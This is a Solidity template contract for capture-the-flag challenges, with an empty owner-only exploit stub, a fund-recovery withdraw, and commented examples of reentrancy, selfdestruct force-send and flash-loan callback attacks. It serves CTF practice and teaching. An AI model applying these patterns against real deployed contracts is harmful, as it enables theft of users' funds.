// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * Template attack contract for CTF challenges.
 * Copy and rename for each challenge.
 *
 * Common attack patterns included as commented examples.
 */
contract AttackTemplate {
    address public owner;
    address public target;

    constructor(address _target) {
        owner = msg.sender;
        target = _target;
    }

    // ============ REENTRANCY PATTERN ============
    // Uncomment receive/fallback for reentrancy attacks
    //
    // uint256 private _reentrancyCount;
    //
    // receive() external payable {
    //     if (_reentrancyCount < 5 && address(target).balance > 0) {
    //         _reentrancyCount++;
    //         IVulnerable(target).withdraw();
    //     }
    // }
    //
    // fallback() external payable {
    //     // Same as receive, or handle specific call data
    // }

    // ============ SELF-DESTRUCT FORCE SEND ============
    // function forceSend() external payable {
    //     selfdestruct(payable(target));
    // }

    // ============ FLASH LOAN CALLBACK ============
    // function onFlashLoan(
    //     address initiator,
    //     address token,
    //     uint256 amount,
    //     uint256 fee,
    //     bytes calldata data
    // ) external returns (bytes32) {
    //     // exploit logic here
    //     return keccak256("ERC3156FlashBorrower.onFlashLoan");
    // }

    function exploit() external {
        require(msg.sender == owner, "not owner");
        // YOUR EXPLOIT LOGIC HERE
    }

    // Recover ETH/tokens after attack
    function withdraw() external {
        require(msg.sender == owner, "not owner");
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success);
    }

    // Accept ETH
    receive() external payable {}
}
